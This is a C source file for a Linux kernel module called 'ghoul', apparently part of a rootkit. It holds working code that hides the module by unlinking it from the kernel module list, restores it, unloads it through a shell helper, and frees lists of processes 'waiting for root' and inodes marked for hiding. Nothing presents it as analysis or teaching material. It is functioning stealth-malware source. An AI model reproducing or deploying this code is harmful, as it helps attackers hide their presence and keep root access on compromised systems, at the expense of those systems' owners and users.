#include <linux/module.h>
#include <linux/slab.h>
#include "load.h"
#include "privileges.h"
#include "hide.h"

static struct list_head *prev_module;
int is_hidden = 0;

void hide_self(void)
{
    pr_info("ghoul: hiding self\n");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden = 1;
}

void show_self(void)
{
    if (!is_hidden)
        return;
    
    pr_info("ghoul: showing self\n");
    list_add(&THIS_MODULE->list, prev_module);
    is_hidden = 0;
}

void unload_self(void)
{
    // as kernel modules cannot unload themselves directly, a usermode helper is used
    char *argv[] = { "/bin/sh", "-c", "/sbin/rmmod ghoul", NULL };
    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

void free_allocations(void)
{
    struct pid_list *pid_entry, *temp_pid_entry;
    struct inode_list *inode_entry, *temp_inode_entry;

    // free PIDs waiting for root
    list_for_each_entry_safe(pid_entry, temp_pid_entry, &pids_waiting_for_root, list) {
        list_del(&pid_entry->list);
        kfree(pid_entry);
    }

    // free hidden inodes
    list_for_each_entry_safe(inode_entry, temp_inode_entry, &inodes_to_hide, list) {
        // free excluded PIDs
        list_for_each_entry_safe(pid_entry, temp_pid_entry, &inode_entry->excluded_pids, list) {
            list_del(&pid_entry->list);
            kfree(pid_entry);
        }
        list_del(&inode_entry->list);
        kfree(inode_entry);
    }
}